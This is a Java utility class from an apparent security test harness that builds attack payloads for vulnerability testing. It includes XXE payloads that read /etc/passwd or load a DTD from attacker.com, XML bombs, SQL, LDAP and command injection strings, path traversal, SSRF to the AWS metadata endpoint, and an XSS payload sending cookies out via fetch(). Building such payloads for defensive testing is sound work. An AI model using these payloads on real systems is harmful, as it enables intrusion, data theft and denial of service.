/*
 * Copyright (c) Codice Foundation
 * <p>
 * This is free software: you can redistribute it and/or modify it under the terms of the GNU Lesser
 * General Public License as published by the Free Software Foundation, either version 3 of the
 * License, or any later version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * Lesser General Public License for more details. A copy of the GNU Lesser General Public License
 * is distributed along with this program and can be found at
 * <http://www.gnu.org/licenses/lgpl.html>.
 */
package org.codice.alliance.test.security.harness.common;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Utility class providing methods for generating malicious payloads for security vulnerability
 * testing.
 *
 * <p><strong>WARNING:</strong> This class contains methods that generate potentially dangerous
 * exploit payloads. These utilities are ONLY for security testing purposes within controlled test
 * environments. NEVER use these payloads in production systems or against systems you do not own.
 *
 * <p>This class supports DO-278 security verification by providing standardized, reproducible
 * exploit payloads for:
 *
 * <ul>
 *   <li>XXE (XML External Entity) attacks
 *   <li>XML bomb attacks (Billion Laughs, Quadratic Blowup)
 *   <li>SQL injection payloads
 *   <li>LDAP injection payloads
 *   <li>Command injection payloads
 *   <li>Path traversal attacks
 *   <li>Deserialization exploits
 *   <li>SSRF (Server-Side Request Forgery) attempts
 * </ul>
 *
 * <p><strong>Usage Example:</strong>
 *
 * <pre>{@code
 * // Generate XXE payload targeting /etc/passwd
 * String xxePayload = VulnerabilityTestUtils.createXxePayload("file:///etc/passwd");
 *
 * // Generate billion laughs XML bomb
 * String xmlBomb = VulnerabilityTestUtils.createBillionLaughsAttack();
 *
 * // Generate SQL injection payload
 * String sqlInjection = VulnerabilityTestUtils.createSqlInjection("' OR '1'='1");
 * }</pre>
 *
 * @see SecurityTestBase for base test infrastructure
 */
public final class VulnerabilityTestUtils {

  private static final Logger LOGGER = LoggerFactory.getLogger(VulnerabilityTestUtils.class);

  /** Marker string to detect if XXE external entity resolution occurred. */
  public static final String XXE_SUCCESS_MARKER = "XXE_EXTERNAL_ENTITY_RESOLVED";

  /** Marker string to detect if SQL injection succeeded. */
  public static final String SQL_INJECTION_MARKER = "SQL_INJECTION_SUCCESS";

  /** Marker string to detect if command injection succeeded. */
  public static final String COMMAND_INJECTION_MARKER = "COMMAND_INJECTION_SUCCESS";

  /** Private constructor to prevent instantiation of utility class. */
  private VulnerabilityTestUtils() {
    throw new UnsupportedOperationException("Utility class should not be instantiated");
  }

  /**
   * Creates an XXE (XML External Entity) payload that attempts to read a file.
   *
   * <p>This payload defines an external entity that references a file URI and attempts to include
   * its contents in the XML document.
   *
   * @param fileUri the file URI to access (e.g., "file:///etc/passwd")
   * @return XML string containing XXE exploit
   */
  public static String createXxePayload(String fileUri) {
    LOGGER.warn("Generating XXE payload targeting: {}", fileUri);
    return String.format(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            + "<!DOCTYPE foo [\n"
            + "  <!ENTITY xxe SYSTEM \"%s\">\n"
            + "]>\n"
            + "<root>\n"
            + "  <data>&xxe;</data>\n"
            + "</root>",
        fileUri);
  }

  /**
   * Creates an XXE payload with parameter entity for more advanced attacks.
   *
   * <p>Parameter entities can be used to exfiltrate data or bypass certain XXE protections.
   *
   * @param fileUri the file URI to access
   * @return XML string containing parameter entity XXE exploit
   */
  public static String createXxeParameterEntityPayload(String fileUri) {
    LOGGER.warn("Generating XXE parameter entity payload targeting: {}", fileUri);
    return String.format(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            + "<!DOCTYPE foo [\n"
            + "  <!ENTITY %% xxe SYSTEM \"%s\">\n"
            + "  <!ENTITY %% dtd SYSTEM \"http://attacker.com/evil.dtd\">\n"
            + "  %%dtd;\n"
            + "]>\n"
            + "<root>\n"
            + "  <data>&send;</data>\n"
            + "</root>",
        fileUri);
  }

  /**
   * Creates an XXE payload that attempts SSRF (Server-Side Request Forgery).
   *
   * <p>This payload attempts to make the server send an HTTP request to an attacker-controlled URL.
   *
   * @param targetUrl the URL to request (e.g., "http://internal-server/admin")
   * @return XML string containing SSRF XXE exploit
   */
  public static String createXxeSsrfPayload(String targetUrl) {
    LOGGER.warn("Generating XXE SSRF payload targeting: {}", targetUrl);
    return String.format(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            + "<!DOCTYPE foo [\n"
            + "  <!ENTITY xxe SYSTEM \"%s\">\n"
            + "]>\n"
            + "<root>\n"
            + "  <data>&xxe;</data>\n"
            + "</root>",
        targetUrl);
  }

  /**
   * Creates a "Billion Laughs" XML bomb payload.
   *
   * <p>This attack uses nested entity expansion to cause exponential memory consumption. A
   * relatively small XML document can expand to gigabytes of memory.
   *
   * <p>The payload creates 10 levels of nested entities, each expanding to 10 copies of the
   * previous level, resulting in 10^10 (10 billion) "lol" strings.
   *
   * @return XML string containing billion laughs attack
   */
  public static String createBillionLaughsAttack() {
    LOGGER.warn("Generating Billion Laughs XML bomb payload");
    return "<?xml version=\"1.0\"?>\n"
        + "<!DOCTYPE lolz [\n"
        + "  <!ENTITY lol \"lol\">\n"
        + "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n"
        + "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n"
        + "  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n"
        + "  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n"
        + "  <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n"
        + "  <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n"
        + "  <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n"
        + "  <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n"
        + "]>\n"
        + "<lolz>&lol9;</lolz>";
  }

  /**
   * Creates a quadratic blowup XML attack payload.
   *
   * <p>This attack exploits XML entity expansion with a different pattern than billion laughs,
   * potentially bypassing some protections.
   *
   * @param entitySize the size of the base entity (larger = more memory consumption)
   * @param repetitions the number of times to repeat the entity
   * @return XML string containing quadratic blowup attack
   */
  public static String createQuadraticBlowupAttack(int entitySize, int repetitions) {
    LOGGER.warn(
        "Generating quadratic blowup attack: entitySize={}, repetitions={}", entitySize, repetitions);

    StringBuilder baseEntity = new StringBuilder();
    for (int i = 0; i < entitySize; i++) {
      baseEntity.append("A");
    }

    StringBuilder entityRefs = new StringBuilder();
    for (int i = 0; i < repetitions; i++) {
      entityRefs.append("&x;");
    }

    return String.format(
        "<?xml version=\"1.0\"?>\n"
            + "<!DOCTYPE root [\n"
            + "  <!ENTITY x \"%s\">\n"
            + "]>\n"
            + "<root>%s</root>",
        baseEntity.toString(), entityRefs.toString());
  }

  /**
   * Creates a basic SQL injection payload.
   *
   * @param injectionString the SQL injection string (e.g., "' OR '1'='1")
   * @return SQL injection payload
   */
  public static String createSqlInjection(String injectionString) {
    LOGGER.warn("Generating SQL injection payload: {}", injectionString);
    return injectionString;
  }

  /**
   * Creates a SQL injection payload for authentication bypass.
   *
   * @return SQL injection payload that attempts to bypass authentication
   */
  public static String createSqlAuthBypass() {
    return createSqlInjection("admin' OR '1'='1' --");
  }

  /**
   * Creates a SQL injection payload with UNION SELECT.
   *
   * @param columnCount the number of columns in the original query
   * @return SQL injection payload with UNION SELECT
   */
  public static String createSqlUnionSelect(int columnCount) {
    StringBuilder columns = new StringBuilder();
    for (int i = 1; i <= columnCount; i++) {
      if (i > 1) {
        columns.append(",");
      }
      columns.append("'").append(SQL_INJECTION_MARKER).append(i).append("'");
    }

    return String.format("' UNION SELECT %s --", columns.toString());
  }

  /**
   * Creates a time-based blind SQL injection payload.
   *
   * @param delaySeconds the number of seconds to delay
   * @return SQL injection payload with time delay
   */
  public static String createSqlTimeBasedBlind(int delaySeconds) {
    LOGGER.warn("Generating time-based blind SQL injection with {} second delay", delaySeconds);
    return String.format("' OR SLEEP(%d) --", delaySeconds);
  }

  /**
   * Creates an LDAP injection payload.
   *
   * @param injectionString the LDAP injection string
   * @return LDAP injection payload
   */
  public static String createLdapInjection(String injectionString) {
    LOGGER.warn("Generating LDAP injection payload: {}", injectionString);
    return injectionString;
  }

  /**
   * Creates an LDAP injection payload for authentication bypass.
   *
   * @return LDAP injection payload that attempts to bypass authentication
   */
  public static String createLdapAuthBypass() {
    return createLdapInjection("*)(uid=*))(|(uid=*");
  }

  /**
   * Creates a command injection payload for Unix/Linux systems.
   *
   * @param command the command to inject
   * @return command injection payload
   */
  public static String createCommandInjectionUnix(String command) {
    LOGGER.warn("Generating Unix command injection payload: {}", command);
    return String.format("; %s #", command);
  }

  /**
   * Creates a command injection payload for Windows systems.
   *
   * @param command the command to inject
   * @return command injection payload
   */
  public static String createCommandInjectionWindows(String command) {
    LOGGER.warn("Generating Windows command injection payload: {}", command);
    return String.format("& %s &", command);
  }

  /**
   * Creates a command injection payload with output redirection.
   *
   * @param command the command to inject
   * @param outputFile the file to redirect output to
   * @return command injection payload with redirection
   */
  public static String createCommandInjectionWithRedirect(String command, String outputFile) {
    LOGGER.warn("Generating command injection with redirect: {} > {}", command, outputFile);
    return String.format("; %s > %s #", command, outputFile);
  }

  /**
   * Creates a path traversal payload.
   *
   * @param targetFile the target file to access (e.g., "etc/passwd")
   * @param depth the directory depth to traverse
   * @return path traversal payload
   */
  public static String createPathTraversal(String targetFile, int depth) {
    LOGGER.warn("Generating path traversal payload: depth={}, target={}", depth, targetFile);
    StringBuilder traversal = new StringBuilder();
    for (int i = 0; i < depth; i++) {
      traversal.append("../");
    }
    traversal.append(targetFile);
    return traversal.toString();
  }

  /**
   * Creates a URL-encoded path traversal payload.
   *
   * @param targetFile the target file to access
   * @param depth the directory depth to traverse
   * @return URL-encoded path traversal payload
   */
  public static String createPathTraversalUrlEncoded(String targetFile, int depth) {
    String traversal = createPathTraversal(targetFile, depth);
    try {
      return URLEncoder.encode(traversal, StandardCharsets.UTF_8.name());
    } catch (UnsupportedEncodingException e) {
      LOGGER.error("Failed to URL encode path traversal", e);
      return traversal;
    }
  }

  /**
   * Creates a double-encoded path traversal payload to bypass input validation.
   *
   * @param targetFile the target file to access
   * @param depth the directory depth to traverse
   * @return double-encoded path traversal payload
   */
  public static String createPathTraversalDoubleEncoded(String targetFile, int depth) {
    // Use %2e%2e%2f for ../ (double encoded)
    StringBuilder traversal = new StringBuilder();
    for (int i = 0; i < depth; i++) {
      traversal.append("%252e%252e%252f");
    }
    traversal.append(targetFile);
    LOGGER.warn("Generating double-encoded path traversal: {}", traversal);
    return traversal.toString();
  }

  /**
   * Creates a serialized Java object for deserialization vulnerability testing.
   *
   * <p><strong>WARNING:</strong> This creates a potentially malicious serialized object. Use only
   * in controlled test environments.
   *
   * @param object the object to serialize
   * @return Base64-encoded serialized object
   * @throws IOException if serialization fails
   */
  public static String createSerializedObject(Object object) throws IOException {
    LOGGER.warn("Generating serialized object of type: {}", object.getClass().getName());
    ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
    try (ObjectOutputStream objectStream = new ObjectOutputStream(byteStream)) {
      objectStream.writeObject(object);
    }
    return Base64.getEncoder().encodeToString(byteStream.toByteArray());
  }

  /**
   * Creates a malformed serialized object for testing deserialization error handling.
   *
   * @return Base64-encoded malformed data
   */
  public static String createMalformedSerializedObject() {
    LOGGER.warn("Generating malformed serialized object");
    Random random = new Random();
    byte[] randomBytes = new byte[256];
    random.nextBytes(randomBytes);
    return Base64.getEncoder().encodeToString(randomBytes);
  }

  /**
   * Creates an SSRF payload for HTTP requests.
   *
   * @param targetUrl the URL to request
   * @return SSRF payload
   */
  public static String createSsrfPayload(String targetUrl) {
    LOGGER.warn("Generating SSRF payload targeting: {}", targetUrl);
    return targetUrl;
  }

  /**
   * Creates an SSRF payload targeting internal services.
   *
   * @param internalHost the internal host to target (e.g., "localhost", "127.0.0.1", "169.254.169.254")
   * @param port the port to target
   * @param path the path to request
   * @return SSRF payload targeting internal service
   */
  public static String createSsrfInternalPayload(String internalHost, int port, String path) {
    String url = String.format("http://%s:%d%s", internalHost, port, path);
    LOGGER.warn("Generating SSRF payload targeting internal service: {}", url);
    return url;
  }

  /**
   * Creates an SSRF payload targeting AWS metadata service.
   *
   * @return SSRF payload for AWS metadata endpoint
   */
  public static String createSsrfAwsMetadata() {
    return createSsrfInternalPayload("169.254.169.254", 80, "/latest/meta-data/");
  }

  /**
   * Creates a script injection payload for XSS testing.
   *
   * @param scriptContent the JavaScript to inject
   * @return XSS payload
   */
  public static String createXssPayload(String scriptContent) {
    LOGGER.warn("Generating XSS payload: {}", scriptContent);
    return String.format("<script>%s</script>", scriptContent);
  }

  /**
   * Creates a reflected XSS payload with alert.
   *
   * @param message the alert message
   * @return XSS payload with alert
   */
  public static String createXssAlert(String message) {
    return createXssPayload(String.format("alert('%s')", message));
  }

  /**
   * Creates a stored XSS payload that exfiltrates data.
   *
   * @param exfilUrl the URL to send stolen data to
   * @return XSS payload for data exfiltration
   */
  public static String createXssDataExfil(String exfilUrl) {
    return createXssPayload(
        String.format(
            "fetch('%s?data='+encodeURIComponent(document.cookie))", exfilUrl));
  }

  /**
   * Creates a weak cryptographic key for testing.
   *
   * @param keySize the key size in bits (should be weak, e.g., 56, 64)
   * @return weak key as byte array
   */
  public static byte[] createWeakKey(int keySize) {
    LOGGER.warn("Generating intentionally weak cryptographic key: {} bits", keySize);
    byte[] key = new byte[keySize / 8];
    // Use predictable pattern for reproducible testing
    for (int i = 0; i < key.length; i++) {
      key[i] = (byte) i;
    }
    return key;
  }

  /**
   * Creates a map of common vulnerability markers for detection.
   *
   * @return map of vulnerability types to detection markers
   */
  public static Map<String, String> getVulnerabilityMarkers() {
    Map<String, String> markers = new HashMap<>();
    markers.put("XXE", XXE_SUCCESS_MARKER);
    markers.put("SQL_INJECTION", SQL_INJECTION_MARKER);
    markers.put("COMMAND_INJECTION", COMMAND_INJECTION_MARKER);
    markers.put("SENSITIVE_FILE", "root:x:0:0"); // /etc/passwd marker
    markers.put("AWS_METADATA", "ami-id"); // AWS metadata marker
    return markers;
  }

  /**
   * Checks if a result contains any vulnerability markers.
   *
   * @param result the result to check
   * @return true if any vulnerability marker is found
   */
  public static boolean containsVulnerabilityMarker(String result) {
    if (result == null) {
      return false;
    }

    for (String marker : getVulnerabilityMarkers().values()) {
      if (result.contains(marker)) {
        LOGGER.warn("Vulnerability marker detected: {}", marker);
        return true;
      }
    }

    return false;
  }

  /**
   * Creates a large payload for buffer overflow testing.
   *
   * @param size the size of the payload in bytes
   * @param pattern the byte pattern to repeat
   * @return buffer overflow payload
   */
  public static byte[] createBufferOverflowPayload(int size, byte pattern) {
    LOGGER.warn("Generating buffer overflow payload: {} bytes", size);
    byte[] payload = new byte[size];
    for (int i = 0; i < size; i++) {
      payload[i] = pattern;
    }
    return payload;
  }

  /**
   * Creates a format string vulnerability payload.
   *
   * @param formatSpecifiers the number of %s or %x specifiers to include
   * @return format string payload
   */
  public static String createFormatStringPayload(int formatSpecifiers) {
    LOGGER.warn("Generating format string payload with {} specifiers", formatSpecifiers);
    StringBuilder payload = new StringBuilder();
    for (int i = 0; i < formatSpecifiers; i++) {
      payload.append("%s");
    }
    return payload.toString();
  }
}
